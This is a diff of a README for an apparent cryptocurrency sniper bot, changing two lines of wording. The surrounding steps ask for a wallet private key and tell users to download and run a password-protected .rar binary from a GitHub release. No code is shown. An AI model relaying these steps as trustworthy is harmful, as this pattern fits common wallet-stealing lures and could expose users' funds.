@@ -111,14 +111,14 @@ The bot currently supports any token using the Uniswap interface.
 			<li><a href="https://www.moralis.io/">Moralis (free)</a></li>
 		</ul>
 	</li>
-	<li>A cryptocurrency wallet with a private key. (Creating a new wallet for use with this bot is recommended)</li>
+	<li>A cryptocurrency wallet with a private key (creating a new wallet for use with this bot is recommended).</li>
 </ul>
 
 ### Installation
 
 Full installation guide here: [Alchemism Installation](https://alchemism.io/docs/getting-started/installation.html)
 
-1. [Download](https://github.com/AlchemismCrypto/crypto-sniper-bot/releases/download/Release/AlchemismLite-2.0.3.rar) last release of AlchemismLite.
+1. [Download](https://github.com/AlchemismCrypto/crypto-sniper-bot/releases/download/Release/AlchemismLite-2.0.3.rar) latest release of AlchemismLite.
 2. Extract the binary files using the password provided in the `README.txt` file of the archive.
 3. Run the program and enter the AlchemismLite invitation code. For the public version, invitation codes are similar to licenses.
 4. After activation the program is ready for configuration.
